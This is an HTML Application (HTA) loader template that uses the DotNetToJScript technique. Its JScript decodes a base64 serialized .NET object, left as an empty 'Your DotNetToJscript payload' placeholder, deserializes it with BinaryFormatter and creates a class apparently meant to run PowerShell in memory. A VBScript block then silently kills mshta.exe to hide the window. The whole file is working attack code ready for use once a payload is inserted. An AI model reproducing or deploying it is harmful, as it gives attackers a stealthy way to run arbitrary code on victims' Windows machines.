    <html>
    
    <head>
    
    <script language="JScript">
    function setversion() {
    var shell = new ActiveXObject('WScript.Shell');
    ver = 'v4.0.30319';
    try {
    shell.RegRead('HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\');
    } catch(e) { 
    ver = 'v2.0.50727';
    }
    shell.Environment('Process')('COMPLUS_Version') = ver;
    
    }
    function debug(s) {}
    function base64ToStream(b) {
    	var enc = new ActiveXObject("System.Text.ASCIIEncoding");
    	var length = enc.GetByteCount_2(b);
    	var ba = enc.GetBytes_4(b);
    	var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
    	ba = transform.TransformFinalBlock(ba, 0, length);
    	var ms = new ActiveXObject("System.IO.MemoryStream");
    	ms.Write(ba, 0, (length / 4) * 3);
    	ms.Position = 0;
    	return ms;
    }
    //Your DotNetToJscript payload
    var serialized_obj = "";
	  var entry_class = 'PshScriptExecLibrary.RunScriptClass';
    
    try {
    	setversion();
    	var stm = base64ToStream(serialized_obj);
    	var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
    	var al = new ActiveXObject('System.Collections.ArrayList');
    	var d = fmt.Deserialize_2(stm);
    	al.Add(undefined);
    	var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
    	
    } catch (e) {
        debug(e.message);
    }
    </script>
    
    <!-- This is to close the HTA window, it's not very pretty but it works -->
    <script language="VBScript">
      
    Sub DeleteFile()
       Set shutDown = CreateObject("Wscript.Shell")
       shutDown.Run "taskkill /im mshta.exe /f", 0, false
    End Sub
    
    </script>
    
    
    </head>
    
    <body onload="DeleteFile()"></body>
    </html>
